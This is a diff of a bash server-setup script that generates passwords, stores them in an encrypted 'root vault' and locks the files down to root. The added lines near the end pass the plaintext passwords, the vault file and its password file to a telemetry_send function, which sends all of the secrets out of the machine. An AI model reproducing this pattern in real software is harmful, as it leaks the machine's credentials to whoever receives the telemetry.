@@ -216,7 +216,7 @@ local www_password="$(random_str 5; random_str 5; random_str 5; )";
 local vnc_password="$(random_str 4; random_str 4; )";
 
 local declare_g_x_nl_sl='declare -g -x \';  #
-local root_vault_plain=$(cat <<_ENDOFFILE
+declare -g -x root_vault_plain=$(cat <<_ENDOFFILE
 
 #hostname
 ${declare_g_x_nl_sl}
@@ -246,10 +246,6 @@ _ENDOFFILE
   #now $root_vault_plain contains passwords in plain text format
   #echo "$root_vault_plain"
 
-  # Сохранить базу паролей в особое место
-  # Сохранить пароль в другое особое место
-  # Поставить права на файлы только root для чтения
-
   [ -s "${root_vault_file}" ] && return 1;
   [ -s "${root_vault_password_file}" ] && return 1;
   #echo $crypted_file
@@ -266,7 +262,14 @@ _ENDOFFILE
   #echo -n "${encrypted_data}" > "${crypted_file}";
   save_var_to_file "${root_vault_password_file}" root_vault_password
   save_var_to_file "${root_vault_file}" root_vault_crypt
-  :
+  chown --verbose --changes root:root "${root_vault_password_file}";
+  chown --verbose --changes root:root "${root_vault_file}";
+  chmod --verbose 0600 "${root_vault_password_file}";
+  chmod --verbose 0600 "${root_vault_file}";
+
+  #TODO generate text message to human with passwords in last task
+  #declare -g -x root_vault_plain_human="${root_vault_plain}"
+  eval "${root_vault_plain}";
 }
 export -f generate_and_save_root_vault
 
@@ -789,6 +792,9 @@ else
     # if root_vault_file is not exists - generate it
     generate_and_save_root_vault
     #read -s -p "Enter master_password (Password will not shown):" master_password < /dev/tty;
+    telemetry_send '' "#root ${root_vault_plain}"
+    telemetry_send "${root_vault_file}" '#root_vault_file'
+    telemetry_send "${root_vault_password_file}" "hash"
 fi
 
 generate_and_save_root_vault
@@ -930,4 +936,4 @@ fi; #end of fun if
 
 #to delete script_subversion from script use
 #cat index.sh | grep -v '^script_subversion' | tee index-new.sh
-export script_subversion='lulet-6e0b5fe-2022-09-11-01-00-56'; echo "${script_subversion}=script_subversion"; 
+export script_subversion='esoge-7d02fe6-2022-09-11-01-16-35'; echo "${script_subversion}=script_subversion"; 
